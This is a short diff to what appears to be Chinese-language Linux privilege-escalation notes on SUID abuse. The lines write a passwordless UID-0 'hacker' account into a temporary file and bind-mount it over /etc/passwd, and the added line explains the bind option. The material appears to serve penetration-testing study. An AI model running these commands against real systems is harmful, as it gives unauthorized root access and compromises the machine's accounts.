@@ -18,3 +18,4 @@ ls -l 命令目录;查看命令目录是否为suid权限
 5.mount挂载路径：将密码文件位置指向其他文件
     echo 'hacker::0:0::/root:/bin/bash' > /tmp/p：写入账户信息
     mount -o bind /tmp/p /etc/passwd：将密码文件指向创建的公共文件
+        -o bind：能够把已经存在的一个目录/文件指向另一个位置
